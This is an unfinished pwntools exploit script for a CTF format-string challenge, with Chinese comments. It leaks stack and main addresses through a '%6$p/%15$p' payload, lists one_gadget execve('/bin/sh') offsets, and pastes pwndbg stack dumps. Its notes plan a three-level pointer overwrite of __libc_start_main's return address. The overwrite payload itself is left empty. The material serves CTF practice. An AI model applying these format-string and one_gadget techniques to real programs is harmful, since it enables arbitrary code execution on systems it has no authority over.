from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
io=process('./pwn')
#io=remote('node4.buuoj.cn',)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive
def ms(name,addr):
    print(name + "---->" + hex(addr))
#0x45226 execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  rax == NULL
#
#0x4527a execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  [rsp+0x30] == NULL
#
#0xf0364 execve("/bin/sh", rsp+0x50, environ)
#constraints:
#  [rsp+0x50] == NULL
#
#0xf1207 execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL



#00:0000│ esp 0xffffd3e0 —▸ 0x804a060 (buf) ◂— 'aaaa\n'
#01:0004│     0xffffd3e4 —▸ 0x8048640 ◂— jno 0x80486b7 /* 'quit' */
#02:0008│     0xffffd3e8 ◂— 0x4
#03:000c│     0xffffd3ec —▸ 0x804857c (play+51) ◂— add esp, 0x10
#04:0010│     0xffffd3f0 —▸ 0x8048645 ◂— cmp eax, 0x3d3d3d3d /* '=====================' */
#05:0014│     0xffffd3f4 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
#06:0018│ ebp 0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd418 ◂— 0x0
#07:001c│     0xffffd3fc —▸ 0x8048584 (play+59) ◂— nop
#08:0020│     0xffffd400 —▸ 0xf7fb3d20 (_IO_2_1_stdout_) ◂— 0xfbad2887
#09:0024│     0xffffd404 ◂— 0x0
#0a:0028│     0xffffd408 —▸ 0xffffd418 ◂— 0x0
#0b:002c│     0xffffd40c —▸ 0x80485b1 (main+42) ◂— nop
#0c:0030│     0xffffd410 —▸ 0xf7fe22b0 (_dl_fini) ◂— endbr32
#0d:0034│     0xffffd414 —▸ 0xffffd430 ◂— 0x1
#0e:0038│     0xffffd418 ◂— 0x0
#0f:003c│     0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10
#10:0040│     0xffffd420 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
#11:0044│     0xffffd424 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
#12:0048│     0xffffd428 ◂— 0x0
#13:004c│     0xffffd42c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10
#14:0050│     0xffffd430 ◂— 0x1
#15:0054│     0xffffd434 —▸ 0xffffd4c4 —▸ 0xffffd631 ◂— '/home/yun/Desktop/fmtxm/playfmt'
#16:0058│     0xffffd438 —▸ 0xffffd4cc —▸ 0xffffd651 ◂— 'SHELL=/bin/bash'
#非栈上的格式化字符串漏洞
#A——-——-----———————B——————————————————C
#栈地址——————————栈数据—————————————数据指向的内容
#思想：先找三级指针
#确定要修改内容的地址比如libc_start_main_addr
#在栈上找和libc_start_main_addr相似的地址A---————————B(相似)——————————C
oneget=[0x45226,0x4527a,0xf0364,0xf1207]
ru(b'=====================')
#泄露栈地址和偏移地址
sl(b'stack%6$pmain%15$p')
#addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
#addr=u32(io.recvuntil(b'\xf7')[-4:])
ru(b'stack0x')
stack= int(r(8),16)
ms(stack,stack)
ru(b'main0x')
main=int(r(8),16)


#一般都有一个三级指针类似于下边这样的：
#A——-——-----———————B——————————————————C
#栈地址——————————栈数据—————————————数据指向的内容

#06:0018│ ebp 0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd418 ◂— 0x0

#首先需要确定要将什么地址里的内容修改成什么，比如修改_libc_start_main为oneget


#第一步目的:
#让_libc_start_main出现在第三级(C)的位置

#做法：1、在栈上(数据部分)找和_libc_start_main相似的地址例如：
#0f:003c│     0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10








#payload1=



gdb.attach(io,'''
b *0x0804853B
''')
pause()


#payload1=





ii()
